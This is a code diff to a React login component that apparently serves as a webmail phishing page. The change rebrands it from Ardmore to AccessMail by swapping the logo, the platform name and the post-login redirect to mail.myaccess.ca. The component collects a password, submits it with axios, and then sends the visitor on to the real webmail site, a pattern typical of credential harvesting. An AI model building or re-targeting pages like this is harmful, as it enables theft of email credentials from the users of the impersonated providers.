@@ -5,6 +5,7 @@ import logo from './logo.png';
 import ardmore from './ardmore.png';
 import { useState } from 'react';
 import axios from 'axios';
+import access from './accessmail.png';
 
 function Home(){
 
@@ -12,7 +13,7 @@ function Home(){
 
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Ardmore")
+    const[platform, setPlatform] = useState("AccessMail")
 
     const[showError, setShowError] = useState(false);
 
@@ -43,7 +44,7 @@ function Home(){
                // console.log(response.data.message);
     
               
-               window.location.href = 'https://webmail.ardmore.net/';
+               window.location.href = 'https://mail.myaccess.ca/';
             }
           } catch (error) {
             // Handle error
@@ -71,7 +72,7 @@ function Home(){
 
             <div className='secondiv col-md-5 m-auto'>
                 <div className='logodiv text-center'>
-                <img src={ardmore} className="mylogo" />
+                <img src={access} className="mylogo" />
 
                 </div>
 
